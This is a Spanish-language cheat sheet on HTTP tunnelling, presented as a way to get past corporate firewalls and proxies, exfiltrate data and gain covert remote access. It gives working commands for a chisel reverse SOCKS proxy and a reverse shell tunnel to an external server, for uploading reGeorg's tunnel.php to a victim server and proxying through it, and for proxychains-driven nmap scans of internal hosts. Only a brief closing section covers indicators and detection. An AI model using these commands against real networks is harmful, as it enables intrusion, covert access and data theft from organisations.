**Cheat Sheet: Tunelización HTTP**

---

### Concepto

La tunelización HTTP permite encapsular tráfico arbitrario (TCP, shell, etc.) dentro de solicitudes HTTP/HTTPS, 
evadiendo restricciones de firewall o proxies corporativos que permiten solo tráfico web.

### Flujo General

1. Cliente genera tráfico (por ejemplo, shell reverse o proxy SOCKS).
2. Este tráfico se encapsula en HTTP/HTTPS (usualmente POST/GET).
3. Se envía al servidor de tunelización (fuera de la red) que lo desencripta y reenvía.
4. Respuesta del servidor se encapsula también en HTTP y vuelve al cliente.

### Casos de Uso

* Exfiltración de datos desde una red interna.
* Acceso remoto encubierto.
* Evasión de firewalls o proxies que permiten solo puertos 80/443.

### Herramientas Populares

* `hts` (HTTP Tunnel Server/Client)
* `reGeorg` (proxy en túnel HTTP)
* `chisel` (túnel TCP en HTTP/HTTPS)
* `webshells` que usan canales HTTP

### Requisitos

* Salida HTTP/HTTPS permitida.
* Acceso a un servidor externo (VPS, C2) que reciba el túnel.
* Herramientas compatibles en ambos extremos.

### Ejemplos

#### Con `chisel`

**Servidor (afuera):**

```bash
chisel server -p 8080 --reverse
```

**Cliente (desde red restringida):**

```bash
chisel client http://<IP-externa>:8080 R:1080:socks
```

Esto crea un proxy SOCKS5 en 127.0.0.1:1080.

#### Con `reGeorg`

1. Subes el `reGeorg` tunnel.php a un servidor vulnerable.
2. En tu equipo:

```bash
python reGeorgSocksProxy.py -u http://victima/tunnel.php -p 1080
```

### Comandos Útiles

* Comprobar conectividad HTTP:

```bash
curl -I http://<destino>
```

* Proxychains con socks local:

```bash
proxychains nmap -sT -Pn -p 445 10.0.0.1
```

* Usar `chisel` como túnel inverso para una shell:

```bash
chisel client http://<servidor>:8080 R:4444:127.0.0.1:4444
```

### Indicadores de Actividad

* Tráfico HTTP saliente inusual.
* Uso frecuente de métodos POST grandes.
* Conexiones persistentes HTTP a un solo destino externo.

### Prevención y Detección

* Inspección profunda de paquetes (DPI).
* Análisis de comportamiento de tráfico.
* Bloqueo de binarios y herramientas conocidas.


